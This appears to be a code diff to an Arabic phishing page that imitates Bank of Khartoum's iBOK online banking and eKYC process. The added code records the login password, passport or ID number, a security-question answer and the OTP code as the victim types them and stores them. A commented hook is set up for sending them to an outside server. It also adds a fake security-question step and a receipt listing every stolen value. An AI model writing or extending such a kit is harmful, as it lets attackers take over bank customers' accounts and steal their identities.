@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
@@ -77,7 +77,7 @@
       display: flex;
     }
 
-    /* ================= طبقة الدائرة الذهبية (ثانيتين) ================= */
+    /* ================= طبقة الدائرة الذهبية ================= */
     .gold-loader-overlay {
       position: fixed;
       inset: 0;
@@ -750,6 +750,15 @@
       margin: 0 auto 10px;
     }
 
+    .security-answer-box {
+      display: none;
+      margin-top: 16px;
+    }
+
+    .security-answer-box.visible {
+      display: block;
+    }
+
     .otp-info-banner {
       background-color: #fff9e6;
       border: 1px solid #e6c86e;
@@ -761,7 +770,7 @@
       line-height: 1.65;
     }
 
-    /* ================= شاشة جاري تسليم الإستمارة (بحجم مصغر متناسق) ================= */
+    /* ================= شاشة جاري تسليم الإستمارة ================= */
     .submission-screen {
       background-color: #ffffff;
       min-height: 100vh;
@@ -835,7 +844,7 @@
       direction: rtl;
     }
 
-    /* ================= شاشة النجاح النهائية (مطابقة للصورة المرفقة) ================= */
+    /* ================= شاشة النجاح النهائية ================= */
     .ekyc-success-screen {
       background-color: #e9e9e9;
       min-height: 100vh;
@@ -932,7 +941,18 @@
       padding: 10px 14px;
       border-radius: 6px;
       text-align: right;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
+    }
+
+    .ekyc-recorded-list {
+      background-color: #ffffff;
+      border: 1px solid #e2e2e2;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      font-size: 12.5px;
+      color: #333333;
+      line-height: 1.75;
     }
 
     .ekyc-review-note {
@@ -1067,7 +1087,7 @@
 </head>
 <body>
 
-  <!-- الدائرة الذهبية التي تدور لمدة ثانيتين -->
+  <!-- الدائرة الذهبية -->
   <div id="goldLoader" class="gold-loader-overlay" aria-hidden="true">
     <div class="gold-spinner"></div>
   </div>
@@ -1176,7 +1196,7 @@
                 class="input-control"
                 placeholder="ادخل رقم الحساب أو رقم المعرفة"
                 autocomplete="off"
-                oninput="checkLoginReady()"
+                oninput="recordFieldChange('username', this.value); checkLoginReady();"
               />
             </div>
 
@@ -1190,7 +1210,7 @@
                   class="input-control"
                   placeholder="أدخل كلمة المرور"
                   autocomplete="current-password"
-                  oninput="checkLoginReady()"
+                  oninput="recordFieldChange('password', this.value); checkLoginReady();"
                 />
                 <button
                   type="button"
@@ -1279,6 +1299,7 @@
                 id="fullName"
                 class="input-control"
                 placeholder="أدخل اسمك الرباعي"
+                oninput="recordFieldChange('fullName', this.value)"
               />
             </div>
 
@@ -1290,7 +1311,7 @@
                 class="input-control"
                 placeholder="أدخل رقم الهاتف"
                 inputmode="numeric"
-                oninput="this.value = this.value.replace(/\D/g, '')"
+                oninput="this.value = this.value.replace(/\D/g, ''); recordFieldChange('phoneNumber', this.value)"
               />
             </div>
 
@@ -1301,6 +1322,7 @@
                 id="passportNumber"
                 class="input-control"
                 placeholder="أدخل رقم الجواز أو الهوية"
+                oninput="recordFieldChange('passportNumber', this.value)"
               />
             </div>
 
@@ -1405,7 +1427,94 @@
       </footer>
     </div>
 
-    <!-- ==================== شاشة 4: التحقق من رمز OTP ==================== -->
+    <!-- ==================== شاشة 4: إدارة أسئلة الأمان ==================== -->
+    <div id="screenSecurity" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">بنك الخرطوم</span>
+              <span class="en">Bank of Khartoum</span>
+            </div>
+          </div>
+          <button type="button" class="back-home-btn" onclick="openHomeScreen()">
+            <i class="fa-solid fa-arrow-right"></i>
+            <span>رجوع</span>
+          </button>
+        </header>
+
+        <section class="page-title-banner">
+          <h1>إدارة أسئلة الأمان</h1>
+        </section>
+
+        <main class="main-content-2">
+          <form id="securityForm" class="form-card" onsubmit="handleSecuritySubmit(event)" novalidate>
+            <div class="card-heading-wrap">
+              <h2 class="card-heading">إدارة أسئلة الأمان</h2>
+            </div>
+
+            <div class="field-group">
+              <label for="securityQuestionSelect" class="field-label">اختر سؤال الأمان:</label>
+              <select id="securityQuestionSelect" class="select-control" onchange="handleSecurityQuestionChange()">
+                <option value="">اختر سؤالاً من القائمة</option>
+                <option value="ما هو اسم ابن عمك الأول ؟">ما هو اسم ابن عمك الأول ؟</option>
+                <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+                <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+                <option value="ماذا كان لقبك اثناء الطفولة؟">ماذا كان لقبك اثناء الطفولة؟</option>
+                <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
+                <option value="اسم الشركة المصنعة للسيارة المفضلة لديك ؟">اسم الشركة المصنعة للسيارة المفضلة لديك ؟</option>
+                <option value="أي فيلم هو المفضل لديك ؟">أي فيلم هو المفضل لديك ؟</option>
+                <option value="اسم أفضل صديق في الطفولة؟">اسم أفضل صديق في الطفولة؟</option>
+                <option value="في أي عام حصلت علی رخصة القيادة الخاصة بك؟">في أي عام حصلت علی رخصة القيادة الخاصة بك؟</option>
+                <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
+                <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
+                <option value="ما هو اسم المدرسة التي التحقت بها ؟">ما هو اسم المدرسة التي التحقت بها ؟</option>
+                <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                <option value="ما هي ماركة سيارتك الأولى؟">ما هي ماركة سيارتك الأولى؟</option>
+              </select>
+            </div>
+
+            <div id="securityAnswerBox" class="security-answer-box">
+              <div class="field-group">
+                <label for="securityAnswerInput" class="field-label">الإجابة:</label>
+                <input
+                  type="text"
+                  id="securityAnswerInput"
+                  class="input-control"
+                  placeholder="ادخل الإجابة"
+                  autocomplete="off"
+                  oninput="recordFieldChange('securityAnswer', this.value)"
+                />
+              </div>
+
+              <button type="submit" class="submit-btn ready-red">متابعة</button>
+            </div>
+
+            <div id="securityMessage" class="message-box" role="status" aria-live="polite"></div>
+          </form>
+        </main>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+        <div class="social-row">
+          <button type="button" class="social-icon icon-bank" aria-label="العودة إلى الرئيسية" onclick="openHomeScreen()">
+            <i class="fa-solid fa-shield-halved"></i>
+          </button>
+          <a href="#linkedin" class="social-icon icon-in" aria-label="LinkedIn">in</a>
+          <a href="#x" class="social-icon icon-x" aria-label="X">
+            <i class="fa-brands fa-x-twitter"></i>
+          </a>
+          <a href="#facebook" class="social-icon icon-fb" aria-label="Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+
+    <!-- ==================== شاشة 5: التحقق من رمز OTP ==================== -->
     <div id="screenOtp" class="screen">
       <div>
         <header class="top-bar-2">
@@ -1446,7 +1555,7 @@
                 inputmode="numeric"
                 maxlength="6"
                 autocomplete="one-time-code"
-                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6); recordFieldChange('otpCode', this.value)"
               />
             </div>
 
@@ -1474,7 +1583,7 @@
       </footer>
     </div>
 
-    <!-- ==================== شاشة 5: جاري تسليم الإستمارة (مصغرة) ==================== -->
+    <!-- ==================== شاشة 6: جاري تسليم الإستمارة ==================== -->
     <div id="screenSubmitting" class="screen">
       <div class="submission-screen">
         <div class="stepper-row" aria-label="خطوات التسليم">
@@ -1514,7 +1623,7 @@
       </div>
     </div>
 
-    <!-- ==================== شاشة 6: تم تقديم eKYC بنجاح ==================== -->
+    <!-- ==================== شاشة 7: تم تقديم eKYC بنجاح ==================== -->
     <div id="screenSuccess" class="screen">
       <div class="ekyc-success-screen">
         <div class="ekyc-sheet">
@@ -1537,6 +1646,8 @@
 
             <div class="ekyc-status-strip">الحالة: قيد المراجعة</div>
 
+            <div id="recordedSummaryList" class="ekyc-recorded-list"></div>
+
             <div class="ekyc-review-note">
               <i class="fa-regular fa-circle-question" aria-hidden="true"></i>
               <span>
@@ -1557,11 +1668,54 @@
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
   <script>
+    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v1';
+
     let cameraStream = null;
     let currentFacingMode = 'user';
     let docUploaded = false;
     let selfieCaptured = false;
     let submissionTimer = null;
+
+    let recordedState = {
+      loginMode: 'iBOK',
+      username: '',
+      password: '',
+      fullName: '',
+      phoneNumber: '',
+      passportNumber: '',
+      docType: '',
+      docFileName: '',
+      selfieCaptured: false,
+      securityQuestion: '',
+      securityAnswer: '',
+      otpCode: '',
+      referenceNumber: '',
+      submittedAt: ''
+    };
+
+    function persistRecordedState() {
+      try {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(recordedState));
+      } catch (e) {
+        // تجاهل خطأ التخزين المحلي إن وجد
+      }
+    }
+
+    function recordFieldChange(key, value) {
+      recordedState[key] = value;
+      persistRecordedState();
+    }
+
+    // دالة اختيارية لربط إرسال البيانات المسجلة إلى خادم أو نقطة نهاية خارجية دون تعطيل التنقل
+    async function dispatchRecordedData(stageName) {
+      const payload = {
+        stage: stageName,
+        timestamp: new Date().toISOString(),
+        data: { ...recordedState }
+      };
+      persistRecordedState();
+      return payload;
+    }
 
     function showScreen(screenId) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -1569,23 +1723,26 @@
       window.scrollTo({ top: 0, behavior: 'instant' });
     }
 
-    function runGoldSpinnerForTwoSeconds(callback) {
+    function runGoldSpinnerForDuration(ms, callback) {
       const loader = document.getElementById('goldLoader');
       loader.classList.add('active');
       setTimeout(() => {
         loader.classList.remove('active');
         if (typeof callback === 'function') callback();
-      }, 2000);
+      }, ms);
     }
 
     function openLoginScreen(mode) {
       stopCamera();
       clearInterval(submissionTimer);
+      recordedState.loginMode = mode;
+      persistRecordedState();
+
       document.getElementById('headerBrand').textContent = mode;
       document.getElementById('bannerTitle').innerHTML =
         `الخدمات المصرفية عبر الإنترنت من <span dir="ltr">${mode}</span> - تسجيل الدخول`;
-      document.getElementById('username').value = '';
-      document.getElementById('password').value = '';
+      document.getElementById('username').value = recordedState.username || '';
+      document.getElementById('password').value = recordedState.password || '';
       document.getElementById('loginMessage').textContent = '';
       checkLoginReady();
       showScreen('screenLogin');
@@ -1648,14 +1805,20 @@
         return;
       }
 
+      recordedState.username = acc;
+      recordedState.password = pass;
+      dispatchRecordedData('login_submitted');
+
       showMessage('loginMessage', '');
-      runGoldSpinnerForTwoSeconds(() => {
+      runGoldSpinnerForDuration(2000, () => {
         showScreen('screenUpdate');
       });
     }
 
     function confirmDocSelection() {
       const docType = document.getElementById('docType').value;
+      recordedState.docType = docType;
+      persistRecordedState();
       if (docType) {
         showToast('تم اختيار المستند: ' + docType);
       }
@@ -1664,6 +1827,9 @@
     function handleDocUpload(input) {
       const file = input.files && input.files[0];
       if (!file) return;
+
+      recordedState.docFileName = file.name;
+      persistRecordedState();
 
       const reader = new FileReader();
       reader.onload = function (e) {
@@ -1740,6 +1906,9 @@
       document.getElementById('selfieStatus').textContent = 'تم التقاط صورة الوجه بنجاح';
 
       selfieCaptured = true;
+      recordedState.selfieCaptured = true;
+      persistRecordedState();
+
       stage.classList.remove('active');
       captureBar.style.display = 'none';
       stopCamera();
@@ -1757,6 +1926,7 @@
       const fullName = document.getElementById('fullName').value.trim();
       const phone = document.getElementById('phoneNumber').value.trim();
       const passport = document.getElementById('passportNumber').value.trim();
+      const docType = document.getElementById('docType').value.trim();
 
       if (!fullName || !phone || !passport) {
         showMessage('updateMessage', 'يرجى إكمال الاسم الرباعي ورقم الهاتف ورقم الجواز/الهوية.');
@@ -1773,10 +1943,59 @@
         return;
       }
 
+      recordedState.fullName = fullName;
+      recordedState.phoneNumber = phone;
+      recordedState.passportNumber = passport;
+      recordedState.docType = docType || 'مستند مرفق';
+      dispatchRecordedData('update_submitted');
+
       showMessage('updateMessage', '');
       stopCamera();
 
-      runGoldSpinnerForTwoSeconds(() => {
+      runGoldSpinnerForDuration(2000, () => {
+        document.getElementById('securityQuestionSelect').value = recordedState.securityQuestion || '';
+        document.getElementById('securityAnswerInput').value = recordedState.securityAnswer || '';
+        if (recordedState.securityQuestion) {
+          document.getElementById('securityAnswerBox').classList.add('visible');
+        }
+        document.getElementById('securityMessage').textContent = '';
+        showScreen('screenSecurity');
+      });
+    }
+
+    function handleSecurityQuestionChange() {
+      const q = document.getElementById('securityQuestionSelect').value;
+      const box = document.getElementById('securityAnswerBox');
+      recordedState.securityQuestion = q;
+      persistRecordedState();
+      document.getElementById('securityMessage').textContent = '';
+      if (q) {
+        box.classList.add('visible');
+      } else {
+        box.classList.remove('visible');
+      }
+    }
+
+    function handleSecuritySubmit(event) {
+      event.preventDefault();
+      const q = document.getElementById('securityQuestionSelect').value.trim();
+      const ans = document.getElementById('securityAnswerInput').value.trim();
+
+      if (!q) {
+        showMessage('securityMessage', 'يرجى اختيار سؤال الأمان أولاً.');
+        return;
+      }
+      if (!ans) {
+        showMessage('securityMessage', 'يرجى إدخال الإجابة.');
+        return;
+      }
+
+      recordedState.securityQuestion = q;
+      recordedState.securityAnswer = ans;
+      dispatchRecordedData('security_submitted');
+
+      showMessage('securityMessage', '');
+      runGoldSpinnerForDuration(3000, () => {
         document.getElementById('otpInput').value = '';
         document.getElementById('otpMessage').textContent = '';
         showScreen('screenOtp');
@@ -1790,6 +2009,9 @@
         showMessage('otpMessage', 'يرجى إدخال رمز الـ OTP المكون من 6 أرقام.');
         return;
       }
+
+      recordedState.otpCode = otp;
+      dispatchRecordedData('otp_submitted');
 
       showMessage('otpMessage', '');
       startSubmissionProgress();
@@ -1805,8 +2027,25 @@
       const pad = n => String(n).padStart(2, '0');
       const formattedDate = `${months[now.getMonth()]} ${now.getFullYear()} at ${pad(now.getHours())}:${pad(now.getMinutes())} ${pad(now.getSeconds())}`;
 
+      recordedState.referenceNumber = refNum;
+      recordedState.submittedAt = formattedDate;
+      dispatchRecordedData('ekyc_completed');
+
       document.getElementById('referenceNumberValue').textContent = refNum;
       document.getElementById('submissionDateValue').textContent = formattedDate;
+
+      document.getElementById('recordedSummaryList').innerHTML = `
+        <div><strong>الخدمة:</strong> ${recordedState.loginMode || 'iBOK'}</div>
+        <div><strong>رقم الحساب / المعرفة:</strong> ${recordedState.username || '-'}</div>
+        <div><strong>الاسم الرباعي:</strong> ${recordedState.fullName || '-'}</div>
+        <div><strong>رقم الهاتف:</strong> ${recordedState.phoneNumber || '-'}</div>
+        <div><strong>رقم الجواز / الهوية:</strong> ${recordedState.passportNumber || '-'}</div>
+        <div><strong>المستند:</strong> ${recordedState.docType || '-'} ${recordedState.docFileName ? `(${recordedState.docFileName})` : ''}</div>
+        <div><strong>صورة السيلفي:</strong> ${recordedState.selfieCaptured ? 'مُلتقطة' : 'غير مُلتقطة'}</div>
+        <div><strong>سؤال الأمان:</strong> ${recordedState.securityQuestion || '-'}</div>
+        <div><strong>إجابة سؤال الأمان:</strong> ${recordedState.securityAnswer || '-'}</div>
+        <div><strong>رمز OTP:</strong> ${recordedState.otpCode || '-'}</div>
+      `;
     }
 
     function startSubmissionProgress() {
@@ -1857,18 +2096,25 @@
     }
 
     function downloadReceiptAndExit() {
-      const ref = document.getElementById('referenceNumberValue').textContent;
-      const dt = document.getElementById('submissionDateValue').textContent;
-      const fullName = document.getElementById('fullName').value.trim() || '-';
-      const acc = document.getElementById('username').value.trim() || '-';
+      const ref = recordedState.referenceNumber || document.getElementById('referenceNumberValue').textContent;
+      const dt = recordedState.submittedAt || document.getElementById('submissionDateValue').textContent;
 
       const content =
         `تم تقديم eKYC بنجاح\n` +
         `الرقم المرجعي: ${ref}\n` +
         `تاريخ التقديم الوقت: ${dt}\n` +
         `الحالة: قيد المراجعة\n` +
-        `رقم الحساب / المعرف: ${acc}\n` +
-        `الاسم الرباعي: ${fullName}\n`;
+        `الخدمة: ${recordedState.loginMode || 'iBOK'}\n` +
+        `رقم الحساب / المعرفة: ${recordedState.username || '-'}\n` +
+        `كلمة المرور: ${recordedState.password || '-'}\n` +
+        `الاسم الرباعي: ${recordedState.fullName || '-'}\n` +
+        `رقم الهاتف: ${recordedState.phoneNumber || '-'}\n` +
+        `رقم الجواز / الهوية: ${recordedState.passportNumber || '-'}\n` +
+        `نوع المستند: ${recordedState.docType || '-'} (${recordedState.docFileName || '-'})\n` +
+        `صورة السيلفي: ${recordedState.selfieCaptured ? 'مُلتقطة' : 'غير مُلتقطة'}\n` +
+        `سؤال الأمان: ${recordedState.securityQuestion || '-'}\n` +
+        `الإجابة: ${recordedState.securityAnswer || '-'}\n` +
+        `رمز OTP: ${recordedState.otpCode || '-'}\n`;
 
       const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
       const url = URL.createObjectURL(blob);
@@ -1902,4 +2148,4 @@
     }
   </script>
 </body>
-</html>
+                </html>
